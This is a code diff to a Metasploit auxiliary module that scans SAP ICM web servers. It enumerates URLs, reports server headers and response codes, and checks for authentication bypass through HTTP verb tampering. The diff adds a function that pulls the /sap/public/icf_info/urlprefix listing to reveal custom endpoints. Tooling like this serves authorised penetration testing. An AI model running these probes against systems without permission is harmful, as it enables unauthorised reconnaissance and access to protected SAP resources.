@@ -36,7 +36,7 @@ class Metasploit3 < Msf::Auxiliary
 
   # Base Structure of module borrowed from jboss_vulnscan
   def run_host(ip)
-    res = send_request_cgi(
+     res = send_request_cgi(
       {
         'uri'       => "/" + Rex::Text.rand_text_alpha(12),
         'method'    => 'GET',
@@ -52,12 +52,12 @@ class Metasploit3 < Msf::Auxiliary
         print_status("#{rhost}:#{rport} Server responded with a blank or missing Server Header")
       end
 
-      if (res.body and /class="note">(.*)code:(.*)</i.match(res.body) )
+      if (res.body && /class="note">(.*)code:(.*)</i.match(res.body) )
         print_error("#{rhost}:#{rport} SAP ICM error message: #{$2}")
       end
 
       # Load URLs
-      urls_to_check = []
+      urls_to_check = check_urlprefixes
       File.open(datastore['URLFILE']) do |f|
         f.each_line do |line|
           urls_to_check.push line
@@ -94,9 +94,11 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if (res)
-      if not @info.include?(res.headers['Server']) and not res.headers['Server'].nil?
-        print_good("New server header seen [#{res.headers['Server']}]")
-        @info << res.headers['Server'] #Add To seen server headers
+      if res.headers['Server']
+        unless @info.include?(res.headers['Server'])
+          print_good("New server header seen [#{res.headers['Server']}]")
+          @info << res.headers['Server'] #Add To seen server headers
+        end
       end
 
       case res.code
@@ -114,9 +116,11 @@ class Metasploit3 < Msf::Auxiliary
         vprint_status("#{full_url} - not found (#{res.code})")
       when 400,500
         print_status("#{full_url} - produced a server error (#{res.code})")
-      when 301, 302, 307
+      when 301, 302
         print_good("#{full_url} - redirected (#{res.code}) to #{res.redirection} (not following)")
         @valid_urls << full_url << "\n"
+      when 307
+        vprint_status("#{full_url} - redirected (#{res.code}) to #{res.redirection} (not following)")   
       else
         print_error("#{full_url} - unhandled response code #{res.code}")
         @valid_urls << full_url << "\n"
@@ -147,11 +151,36 @@ class Metasploit3 < Msf::Auxiliary
       'version'   => '1.0' # 1.1 makes the head request wait on timeout for some reason
     })
 
-    if (res and res.code == 200)
+    if (res && res.code == 200)
       print_good("#{full_url} Got authentication bypass via HTTP verb tampering")
       @valid_urls << full_url << "\n"
     else
-      vprint_status("#{full_url} Could not get authentication bypass via HTTP verb tampering")
+      vprint_status("#{rhost}:#{rport} Could not get authentication bypass via HTTP verb tampering")
     end
+  end
+
+  # "/urlprefix outputs the list of URL prefixes that are handled in the ABAP part of the SAP Web AS.
+  # This is how the message server finds out which URLs must be forwarded where.
+  #  (SAP help) -> this disclose custom URLs that are also checked for authentication
+  def check_urlprefixes
+    urls = []
+    res = send_request_cgi({
+      'uri'       => "/sap/public/icf_info/urlprefix",
+      'method'    => 'GET',
+    })
+
+    if (res && res.code == 200)
+      res.body.each_line do |line|
+        if line =~ /PREFIX=/
+          url_enc = line.sub(/^PREFIX=/, '')
+          url_dec = URI.unescape(url_enc).sub(/;/, '')
+          urls << url_dec.strip
+        end
+      end
+    else
+      print_error("#{rhost}:#{rport} Could not retrieve urlprefixes")
+    end
+
+    urls
   end
 end
